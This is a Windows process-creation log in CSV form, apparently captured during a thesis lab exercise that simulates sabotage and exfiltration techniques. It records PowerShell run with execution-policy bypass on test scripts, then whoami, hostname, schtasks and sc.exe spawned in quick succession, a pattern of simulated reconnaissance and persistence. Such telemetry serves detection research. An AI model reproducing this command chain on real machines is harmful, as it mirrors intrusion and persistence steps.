_ts,Timestamp,PPID,PID,Name,CommandLine,ParentCommandLine,CallChain,ClientId
1783857469134,2026-07-12T11:57:06Z,12028,8452,powershell.exe,"powershell.exe  -NoProfile -ExecutionPolicy Bypass -File ""C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"" ","""cmd.exe"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"" ",explorer.exe <- powershell.exe <- cmd.exe <- powershell.exe,C.364907172793f8c7
1783857469134,2026-07-12T11:57:34Z,12104,11516,cmd.exe,"""cmd.exe"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"" ","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",explorer.exe <- powershell.exe <- cmd.exe,C.364907172793f8c7
1783857469134,2026-07-12T11:57:35Z,11516,620,powershell.exe,"powershell.exe  -NoProfile -ExecutionPolicy Bypass -File ""C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"" ","""cmd.exe"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"" ",explorer.exe <- powershell.exe <- cmd.exe <- powershell.exe,C.364907172793f8c7
1783857587544,2026-07-12T11:58:41Z,904,7972,dllhost.exe,"""C:\Windows\system32\DllHost.exe"" /Processid:{4A616E61-3BFE-4F5C-937F-B8602BF16679}",C:\Windows\system32\svchost.exe -k DcomLaunch -p,wininit.exe <- services.exe <- svchost.exe <- dllhost.exe,C.364907172793f8c7
1783857587544,2026-07-12T11:58:49Z,904,5264,dllhost.exe,,C:\Windows\system32\svchost.exe -k DcomLaunch -p,Null,C.364907172793f8c7
1783857587544,2026-07-12T11:58:54Z,904,6288,dllhost.exe,C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5},C:\Windows\system32\svchost.exe -k DcomLaunch -p,wininit.exe <- services.exe <- svchost.exe <- dllhost.exe,C.364907172793f8c7
1783857587544,2026-07-12T11:59:25Z,904,492,dllhost.exe,"""C:\Windows\system32\DllHost.exe"" /Processid:{4A616E61-3BFE-4F5C-937F-B8602BF16679}",C:\Windows\system32\svchost.exe -k DcomLaunch -p,wininit.exe <- services.exe <- svchost.exe <- dllhost.exe,C.364907172793f8c7
1783857719392,2026-07-12T11:59:45Z,904,11380,dllhost.exe,"""C:\Windows\system32\DllHost.exe"" /Processid:{4A616E61-3BFE-4F5C-937F-B8602BF16679}",C:\Windows\system32\svchost.exe -k DcomLaunch -p,wininit.exe <- services.exe <- svchost.exe <- dllhost.exe,C.364907172793f8c7
1783857719392,2026-07-12T11:59:54Z,904,3556,WmiPrvSE.exe,,C:\Windows\system32\svchost.exe -k DcomLaunch -p,Null,C.364907172793f8c7
1783857719392,2026-07-12T12:01:01Z,9348,8344,chrome.exe,"""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"" --type=utility --utility-sub-type=chrome.mojom.UtilWin --lang=es --service-sandbox-type=none --message-loop-type-ui --no-pre-read-main-dll --metrics-shmem-handle=7068,i,14018290413572933639,8790871767487972239,524288 --field-trial-handle=1992,i,15883667373147678976,5585095587974020185,262144 --variations-seed-version --pseudonymization-salt-handle=1996,i,15414328641234855124,13154617930620137814,4 --trace-process-track-uuid=3190709035975089491 --mojo-platform-channel-handle=6972 /prefetch:8","""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"" --flag-switches-begin --flag-switches-end --do-not-de-elevate --single-argument https://127.0.0.1:8889/",chrome.exe <- chrome.exe,C.364907172793f8c7
1783857719392,2026-07-12T12:01:06Z,6740,3952,NvSHIM.exe,,"""C:\Program Files\NVIDIA Corporation\NvContainer\nvcontainer.exe"" -f ""C:\ProgramData\NVIDIA\NvContainerUser%d.log"" -d ""C:\Program Files\NVIDIA Corporation\NvContainer\plugins\User"" -r -l 3 -p 30000 -st ""C:\Program Files\NVIDIA Corporation\NvContainer\NvContainerTelemetryApi.dll"" -c",Null,C.364907172793f8c7
1783857719392,2026-07-12T12:01:06Z,3952,4964,conhost.exe,,,Null,C.364907172793f8c7
1783857719392,2026-07-12T12:01:12Z,904,1480,WmiPrvSE.exe,C:\Windows\system32\wbem\wmiprvse.exe,C:\Windows\system32\svchost.exe -k DcomLaunch -p,wininit.exe <- services.exe <- svchost.exe <- WmiPrvSE.exe,C.364907172793f8c7
1783857719392,2026-07-12T12:01:12Z,772,3736,svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s NetSetupSvc,C:\Windows\system32\services.exe,wininit.exe <- services.exe <- svchost.exe,C.364907172793f8c7
1783857719392,2026-07-12T12:01:17Z,9348,9212,chrome.exe,,"""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"" --flag-switches-begin --flag-switches-end --do-not-de-elevate --single-argument https://127.0.0.1:8889/",Null,C.364907172793f8c7
1783857719392,2026-07-12T12:01:18Z,9348,11892,chrome.exe,,"""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"" --flag-switches-begin --flag-switches-end --do-not-de-elevate --single-argument https://127.0.0.1:8889/",Null,C.364907172793f8c7
1783857719392,2026-07-12T12:01:23Z,9348,1412,chrome.exe,,"""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"" --flag-switches-begin --flag-switches-end --do-not-de-elevate --single-argument https://127.0.0.1:8889/",Null,C.364907172793f8c7
1783857719392,2026-07-12T12:01:47Z,12104,4180,powershell.exe,,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",Null,C.364907172793f8c7
1783857719392,2026-07-12T12:01:48Z,12104,10224,cmd.exe,,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",Null,C.364907172793f8c7
1783857719392,2026-07-12T12:01:48Z,12104,5448,cmd.exe,,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",Null,C.364907172793f8c7
1783857719392,2026-07-12T12:01:48Z,5448,3344,whoami.exe,,,Null,C.364907172793f8c7
1783857719392,2026-07-12T12:01:48Z,12104,11152,cmd.exe,,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",Null,C.364907172793f8c7
1783857719392,2026-07-12T12:01:48Z,11152,10736,HOSTNAME.EXE,,,Null,C.364907172793f8c7
1783857719392,2026-07-12T12:01:48Z,12104,8756,cmd.exe,,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",Null,C.364907172793f8c7
1783857719392,2026-07-12T12:01:48Z,12104,2384,schtasks.exe,,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",Null,C.364907172793f8c7
1783857719392,2026-07-12T12:01:49Z,12104,7380,schtasks.exe,,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",Null,C.364907172793f8c7
1783857719392,2026-07-12T12:01:49Z,1320,4008,cmd.exe,,C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,Null,C.364907172793f8c7
1783857719392,2026-07-12T12:01:49Z,4008,11224,conhost.exe,,,Null,C.364907172793f8c7
1783857719392,2026-07-12T12:01:51Z,12104,12020,schtasks.exe,,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",Null,C.364907172793f8c7
1783857719392,2026-07-12T12:01:51Z,12104,7744,powershell.exe,,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",Null,C.364907172793f8c7
1783857719392,2026-07-12T12:01:52Z,7744,11676,sc.exe,,,Null,C.364907172793f8c7
1783857719392,2026-07-12T12:01:52Z,12104,12228,powershell.exe,,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",Null,C.364907172793f8c7
1783857719392,2026-07-12T12:01:55Z,904,8808,dllhost.exe,C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5},C:\Windows\system32\svchost.exe -k DcomLaunch -p,wininit.exe <- services.exe <- svchost.exe <- dllhost.exe,C.364907172793f8c7
1783857719392,2026-07-12T12:01:56Z,12104,9768,powershell.exe,,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",Null,C.364907172793f8c7
1783857876694,2026-07-12T12:02:01Z,772,8908,svchost.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
1783857876694,2026-07-12T12:02:03Z,904,7056,dllhost.exe,C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5},C:\Windows\system32\svchost.exe -k DcomLaunch -p,wininit.exe <- services.exe <- svchost.exe <- dllhost.exe,C.364907172793f8c7
1783857876694,2026-07-12T12:02:17Z,904,6932,dllhost.exe,C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5},C:\Windows\system32\svchost.exe -k DcomLaunch -p,wininit.exe <- services.exe <- svchost.exe <- dllhost.exe,C.364907172793f8c7
1783857876694,2026-07-12T12:02:19Z,904,2180,dllhost.exe,"""C:\Windows\system32\DllHost.exe"" /Processid:{4A616E61-3BFE-4F5C-937F-B8602BF16679}",C:\Windows\system32\svchost.exe -k DcomLaunch -p,wininit.exe <- services.exe <- svchost.exe <- dllhost.exe,C.364907172793f8c7
1783858012423,2026-07-12T12:05:04Z,904,11424,dllhost.exe,"""C:\Windows\system32\DllHost.exe"" /Processid:{4A616E61-3BFE-4F5C-937F-B8602BF16679}",C:\Windows\system32\svchost.exe -k DcomLaunch -p,wininit.exe <- services.exe <- svchost.exe <- dllhost.exe,C.364907172793f8c7
1783858012423,2026-07-12T12:05:19Z,904,8448,dllhost.exe,C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5},C:\Windows\system32\svchost.exe -k DcomLaunch -p,wininit.exe <- services.exe <- svchost.exe <- dllhost.exe,C.364907172793f8c7
1783858012423,2026-07-12T12:06:09Z,904,4152,dllhost.exe,"""C:\Windows\system32\DllHost.exe"" /Processid:{4A616E61-3BFE-4F5C-937F-B8602BF16679}",C:\Windows\system32\svchost.exe -k DcomLaunch -p,wininit.exe <- services.exe <- svchost.exe <- dllhost.exe,C.364907172793f8c7
1783858012423,2026-07-12T12:06:10Z,904,3716,smartscreen.exe,C:\Windows\System32\smartscreen.exe -Embedding,C:\Windows\system32\svchost.exe -k DcomLaunch -p,wininit.exe <- services.exe <- svchost.exe <- smartscreen.exe,C.364907172793f8c7
1783858012423,2026-07-12T12:06:10Z,7848,11428,notepad.exe,"""C:\Windows\system32\NOTEPAD.EXE"" C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\Logs_Pruebas_TFM\PUBLIC_ARTIFACTS_FINAL\01_ProcessCreation\FP_start_utc.txt",C:\Windows\Explorer.EXE,explorer.exe <- notepad.exe,C.364907172793f8c7
1783858149256,2026-07-12T12:06:57Z,904,11244,ScreenClippingHost.exe,"""C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\ScreenClippingHost.exe"" -ServerName:ScreenClipping.AppX6726kd2wrry6c6n8nc57a1zn08dmzmbt.mca",C:\Windows\system32\svchost.exe -k DcomLaunch -p,wininit.exe <- services.exe <- svchost.exe <- ScreenClippingHost.exe,C.364907172793f8c7
1783858149256,2026-07-12T12:06:58Z,904,7172,RuntimeBroker.exe,C:\Windows\System32\RuntimeBroker.exe -Embedding,C:\Windows\system32\svchost.exe -k DcomLaunch -p,wininit.exe <- services.exe <- svchost.exe <- RuntimeBroker.exe,C.364907172793f8c7
1783858149256,2026-07-12T12:07:01Z,904,8552,RuntimeBroker.exe,,C:\Windows\system32\svchost.exe -k DcomLaunch -p,Null,C.364907172793f8c7
1783858252773,2026-07-12T12:09:46Z,1320,9568,msoia.exe,,C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,Null,C.364907172793f8c7
1783858252773,2026-07-12T12:09:46Z,1320,10888,MicrosoftEdgeUpdate.exe,,C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,Null,C.364907172793f8c7
1783858252773,2026-07-12T12:09:46Z,1320,2148,updater.exe,,C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,Null,C.364907172793f8c7
1783858252773,2026-07-12T12:09:46Z,2148,9392,updater.exe,,,Null,C.364907172793f8c7
1783858252773,2026-07-12T12:09:46Z,772,3172,updater.exe,"""C:\Program Files (x86)\Google\GoogleUpdater\150.0.7863.0\updater.exe"" --system --windows-service --service=update-internal",C:\Windows\system32\services.exe,wininit.exe <- services.exe <- updater.exe,C.364907172793f8c7
1783858252773,2026-07-12T12:09:46Z,3172,1960,updater.exe,"""C:\Program Files (x86)\Google\GoogleUpdater\150.0.7863.0\updater.exe"" --crash-handler --system ""--database=C:\Program Files (x86)\Google\GoogleUpdater\150.0.7863.0\Crashpad"" --url=https://clients2.google.com/cr/report --annotation=prod=Update4 --annotation=ver=150.0.7863.0 ""--attachment=C:\Program Files (x86)\Google\GoogleUpdater\updater.log"" ""--attachment=C:\Program Files (x86)\Google\GoogleUpdater\updater_history.jsonl"" --initial-client-data=0x24c,0x250,0x254,0x248,0x258,0x7ff689f4187c,0x7ff689f41888,0x7ff689f41898","""C:\Program Files (x86)\Google\GoogleUpdater\150.0.7863.0\updater.exe"" --system --windows-service --service=update-internal",wininit.exe <- services.exe <- updater.exe <- updater.exe,C.364907172793f8c7
1783858252773,2026-07-12T12:09:53Z,3172,788,cmd.exe,,,Null,C.364907172793f8c7
1783858252773,2026-07-12T12:09:53Z,788,2916,conhost.exe,,,Null,C.364907172793f8c7
1783858252773,2026-07-12T12:09:53Z,788,5068,cmd.exe,,,Null,C.364907172793f8c7
1783858252773,2026-07-12T12:09:53Z,788,10052,findstr.exe,,,Null,C.364907172793f8c7
1783858252773,2026-07-12T12:09:53Z,788,5712,PING.EXE,,,Null,C.364907172793f8c7
1783858434355,2026-07-12T12:11:12Z,904,5740,dllhost.exe,"""C:\Windows\system32\DllHost.exe"" /Processid:{4A616E61-3BFE-4F5C-937F-B8602BF16679}",C:\Windows\system32\svchost.exe -k DcomLaunch -p,wininit.exe <- services.exe <- svchost.exe <- dllhost.exe,C.364907172793f8c7
1783858434355,2026-07-12T12:12:49Z,904,3060,dllhost.exe,"""C:\Windows\system32\DllHost.exe"" /Processid:{4A616E61-3BFE-4F5C-937F-B8602BF16679}",C:\Windows\system32\svchost.exe -k DcomLaunch -p,wininit.exe <- services.exe <- svchost.exe <- dllhost.exe,C.364907172793f8c7
1783858434355,2026-07-12T12:12:49Z,904,5168,smartscreen.exe,C:\Windows\System32\smartscreen.exe -Embedding,C:\Windows\system32\svchost.exe -k DcomLaunch -p,wininit.exe <- services.exe <- svchost.exe <- smartscreen.exe,C.364907172793f8c7
1783858434355,2026-07-12T12:12:51Z,7848,10040,notepad.exe,"""C:\Windows\system32\NOTEPAD.EXE"" C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\Logs_Pruebas_TFM\PUBLIC_ARTIFACTS_FINAL\01_ProcessCreation\TEC_end_utc.txt",C:\Windows\Explorer.EXE,explorer.exe <- notepad.exe,C.364907172793f8c7
1783858434355,2026-07-12T12:12:58Z,904,10980,dllhost.exe,,C:\Windows\system32\svchost.exe -k DcomLaunch -p,Null,C.364907172793f8c7
1783858434355,2026-07-12T12:12:58Z,7848,11576,notepad.exe,,C:\Windows\Explorer.EXE,Null,C.364907172793f8c7
